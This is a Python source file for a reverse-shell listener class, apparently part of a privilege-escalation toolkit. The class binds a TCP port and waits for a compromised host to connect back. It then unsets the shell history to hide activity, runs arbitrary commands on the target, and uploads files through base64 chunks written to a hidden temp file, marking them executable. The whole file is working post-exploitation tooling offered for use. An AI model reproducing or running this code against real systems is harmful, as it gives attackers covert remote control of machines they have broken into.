"""Reverse shell transport — TCP listener that accepts incoming shells."""
from __future__ import annotations

import os
import select
import socket
import threading
import time
from typing import Optional


class RevShellTransport:
    """Listen for and manage a single reverse shell connection."""

    def __init__(self):
        self._server_sock: Optional[socket.socket] = None
        self._client_sock: Optional[socket.socket] = None
        self._listen_host: Optional[str] = None
        self._listen_port: Optional[int] = None
        self._remote_addr: Optional[tuple] = None
        self._connected = False
        self._listening = False
        self._lock = threading.Lock()
        self._accept_thread: Optional[threading.Thread] = None
        self._delimiter = "___PRIVESC_CMD_DONE___"

    @property
    def connected(self) -> bool:
        return self._connected and self._client_sock is not None

    @property
    def listening(self) -> bool:
        return self._listening and self._server_sock is not None

    @property
    def info(self) -> dict:
        return {
            "type": "revshell",
            "listen_host": self._listen_host,
            "listen_port": self._listen_port,
            "remote_addr": self._remote_addr,
            "listening": self.listening,
            "connected": self.connected,
        }

    def start_listener(self, host: str = "0.0.0.0", port: int = 4444) -> dict:
        with self._lock:
            if self._server_sock:
                try:
                    self._server_sock.close()
                except Exception:
                    pass

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(None)
            try:
                sock.bind((host, port))
                sock.listen(1)
            except OSError as e:
                sock.close()
                return {"success": False, "error": f"bind failed: {e}"}

            self._server_sock = sock
            self._listen_host = host
            self._listen_port = port
            self._listening = True
            self._connected = False
            self._client_sock = None

            self._accept_thread = threading.Thread(
                target=self._accept_loop, daemon=True
            )
            self._accept_thread.start()

            return {"success": True, **self.info}

    def _accept_loop(self):
        """Block until a client connects (runs in background thread)."""
        try:
            client, addr = self._server_sock.accept()
            with self._lock:
                self._client_sock = client
                self._client_sock.settimeout(30.0)
                self._remote_addr = addr
                self._connected = True
                self._stabilize_shell()
        except Exception:
            pass

    def _stabilize_shell(self):
        """Send initial commands to make the shell more usable."""
        try:
            stabilize = (
                "export TERM=xterm\n"
                "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
                "unset HISTFILE\n"
            )
            self._client_sock.sendall(stabilize.encode())
            time.sleep(0.3)
            self._drain()
        except Exception:
            pass

    def _drain(self) -> str:
        """Read all available data from socket without blocking."""
        data = b""
        self._client_sock.setblocking(False)
        try:
            while True:
                ready, _, _ = select.select([self._client_sock], [], [], 0.1)
                if not ready:
                    break
                chunk = self._client_sock.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (BlockingIOError, socket.error):
            pass
        finally:
            self._client_sock.setblocking(True)
            self._client_sock.settimeout(30.0)
        return data.decode("utf-8", errors="replace")

    def stop_listener(self) -> dict:
        with self._lock:
            if self._client_sock:
                try:
                    self._client_sock.close()
                except Exception:
                    pass
                self._client_sock = None
            if self._server_sock:
                try:
                    self._server_sock.close()
                except Exception:
                    pass
                self._server_sock = None
            self._listening = False
            self._connected = False
            self._remote_addr = None
            return {"success": True, "message": "listener stopped"}

    def disconnect(self) -> dict:
        return self.stop_listener()

    def execute(self, command: str, timeout: float = 30.0) -> dict:
        if not self.connected:
            return {"success": False, "error": "no shell connected"}
        with self._lock:
            try:
                self._drain()

                wrapped = f"{command}\necho {self._delimiter} $?\n"
                self._client_sock.sendall(wrapped.encode())

                output = b""
                self._client_sock.settimeout(timeout)
                deadline = time.time() + timeout

                while time.time() < deadline:
                    ready, _, _ = select.select(
                        [self._client_sock], [], [], min(0.5, deadline - time.time())
                    )
                    if ready:
                        chunk = self._client_sock.recv(65536)
                        if not chunk:
                            self._connected = False
                            return {
                                "success": False,
                                "error": "connection lost",
                            }
                        output += chunk
                        decoded = output.decode("utf-8", errors="replace")
                        if self._delimiter in decoded:
                            break

                decoded = output.decode("utf-8", errors="replace")

                if self._delimiter not in decoded:
                    return {
                        "success": True,
                        "stdout": decoded.strip(),
                        "stderr": "",
                        "exit_code": -1,
                        "note": "timeout — partial output",
                    }

                parts = decoded.split(self._delimiter)
                stdout = parts[0].strip()
                exit_str = parts[1].strip().split("\n")[0].strip() if len(parts) > 1 else "-1"
                try:
                    exit_code = int(exit_str)
                except ValueError:
                    exit_code = -1

                return {
                    "success": True,
                    "stdout": stdout,
                    "stderr": "",
                    "exit_code": exit_code,
                }
            except socket.timeout:
                return {"success": False, "error": f"command timed out ({timeout}s)"}
            except Exception as e:
                self._connected = False
                return {"success": False, "error": str(e)}

    def upload(self, local_path: str, remote_path: str) -> dict:
        """Upload via base64 encoding through the shell."""
        if not self.connected:
            return {"success": False, "error": "no shell connected"}
        try:
            import base64
            with open(local_path, "rb") as f:
                data = f.read()
            b64 = base64.b64encode(data).decode()

            chunk_size = 4096
            chunks = [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]

            self.execute(f"rm -f {remote_path}")
            for chunk in chunks:
                result = self.execute(
                    f"echo -n '{chunk}' >> /tmp/.privesc_b64_tmp"
                )
                if not result.get("success"):
                    return result

            result = self.execute(
                f"base64 -d /tmp/.privesc_b64_tmp > {remote_path} && "
                f"chmod 755 {remote_path} && rm -f /tmp/.privesc_b64_tmp"
            )
            if result.get("exit_code", -1) != 0:
                return {"success": False, "error": "base64 decode failed on target"}

            return {"success": True, "local": local_path, "remote": remote_path}
        except Exception as e:
            return {"success": False, "error": str(e)}
